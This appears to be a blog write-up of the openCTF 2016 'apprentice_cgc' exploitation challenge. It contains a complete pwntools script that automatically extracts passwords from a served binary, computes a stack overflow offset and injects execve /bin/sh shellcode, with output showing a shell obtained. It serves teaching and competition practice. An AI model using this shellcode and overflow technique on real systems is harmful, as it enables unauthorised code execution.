---
layout: post
title: openCTF 2016 - apprentice_cgc
category: [Exploitation]
tags: [Exploitation, openCTF]
comments: true
---

**Points:** 300
**Solves:** 
**Category:** Exploitation, CRS
**Description:** So, neophyte_cgc was pretty straightforward.
This isn't.
Server: 172.31.1.47:1624

> [apprentice_cgc]({{site.url}}/assets/apprentice_cgc)

Statically compiled, stripped binary this challenge was about Automatic Exploit Generation (AEG). The server sends us a binary with two different passwords on every run. We have to send the correct passwords in order to reach the vulnerable function.

![vuln]({{site.url}}/assets/screen-openctf-3.png)

The `vulnerable` function had a classic stack overflow with no canaries, NX disabled and ASLR disabled.

![vuln2]({{site.url}}/assets/screen-openctf-4.png)

The local stack size of the vulnerable function was also different on each run.

# Ghetto Solution

Solution steps:  

1. Connect to the server and get the binary
2. Drop the binary on disk and analyze it with objdump, storing the output in a variable
3. Since the 2 password strings were exactly 32 bytes each and lowercase alphanum chars I used strings to find them
4. Used the objdump output to find the size of the `vulnerable` function
5. Send the payload and get the flag

{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys, re

# flag itoldyou__IT_WOULD_GET_W0rse_imnotangrybro

def filterPick(list,filter):
    return [ ( l, m.group(1) ) for l in list for m in (filter(l),) if m]


def exploit(r):
  if len(sys.argv) > 1:   # if remote get the binary and store on disk
    r.recvuntil("Apprentice CRS - (Cyber Reasoning System)\n")
    binary = r.recvuntil('Can you exploit me in under 10 seconds?\n')

    ofile = open('apprentice_cgc_drop', 'wb')
    ofile.write(binary)
    ofile.close()

  else:        # else use binary already on disk
    binary = bytearray(open('apprentice_cgc', 'r').read())
  
  entry = u32(binary[0x18:0x18+4])            # find entry point from
  log.info("Entry point: " + hex(entry))      # elf header

  # get output of objdump
  output = subprocess.Popen(["objdump", "-d", "-M", "intel", "apprentice_cgc_drop"], stdout=subprocess.PIPE).communicate()[0].split('\n')

  for line in range(len(output)):             # parse each line
    if hex(entry)[2:]+':' in output[line]:    # look for entry point
      for i in range(15):                     # get 15 lines down from entry point
        if 'call' in output[line+i]:          # get the line of entry point
          main = output[line+i-1].split(' ')[-1][2:]  # get the first argument (addr of main)
          log.info("Main at: " + main)        # main found

  main_output = []                            # store main disassembly here
  for line in range(len(output)):             # parse output
    if main+':' in output[line]:              # from main's address
      i = 0
      while 'ret' not in output[line+i]:      # until ret
        main_output.append(output[line+i])
        i += 1
      break

  calls = []                                  # store addr of all called funcs from main
  for line in range(len(main_output)):
    if 'call' in main_output[line]:
      calls.append(main_output[line].split(' ')[-1].strip())

  strings = subprocess.Popen(["strings", "-n 32", "-d", "apprentice_cgc_drop"], stdout=subprocess.PIPE).communicate()[0].split('\n')

  searchRegex = re.compile('(^[a-z0-9]{32}$)').search # regex to find the 2 passwds
  x = filterPick(strings,searchRegex)         # find the two passwords
  canaries = []

  canaries.append(x[0][0])
  canaries.append(x[-1][-1])
  print canaries                              # let me see the passwords

  r.sendline(canaries[0].strip())             # send the first password
  r.recvline()
  r.recvline()
  inBuffer = int(r.recvline().strip(), 16)    # Oh the binary sends us 
  log.info("Stack is at: " + hex(inBuffer))   # the addr of the stack :)

  for line in range(len(output)):
    if calls[-1][2:]+':' in output[line]:     # from the start of the vuln func's disassembly
      for i in range(5):                      # look 5 lines down
        if 'sub' in output[line+i]:           # if u see 'sub'
          offset = int(output[line+i].split(',')[-1].strip(), 16) # get size of stack frame
      

      for i in range(9, 15):                  # in vuln func 9 lines down
        if 'lea' in output[line+i]:           # look for local buffer
          vulnBuf = int( output[line+i].split('-')[-1].strip(']'), 16) # get distance between
                                                                      # stack frame and buffer

  offset = offset + (offset - vulnBuf)+3      # calc how much garbage to send

  sc = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
      "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

  r.send(canaries[1]+"\x00")

  payload = "\x90" * (offset - (len(sc)))
  payload += sc
  payload += p32(inBuffer-(offset/2)) * 100

  r.sendline(payload)

  r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/apprentice_cgc'])
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}


{% highlight text %}
➜  openCTF python ./apprentice_cgc_solution.py
[*] For remote: ./apprentice_cgc_solution.py HOST PORT
[+] Starting program '/vagrant/openCTF/apprentice_cgc_drop': Done
[22003]
[*] Paused (press any to continue)
[*] Entry point: 0x8048736
[*] Main at: 8048909
['0x8048760', '0x806ccf0', '0x8050c70', '0x8050c70', '0x804ed50', '0x8048280', '0x80488da', '0x804ed50', '0x8048280', '0x804889a']
['etvqwoqfrevvmesmuwtnzvqbbaozpxdt', 'apovsbykslqvuziibstoyjqmtjywfwjo']
[*] Stack is at: 0xffce268c
[*] Switching to interactive mode
$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
$
{% endhighlight %}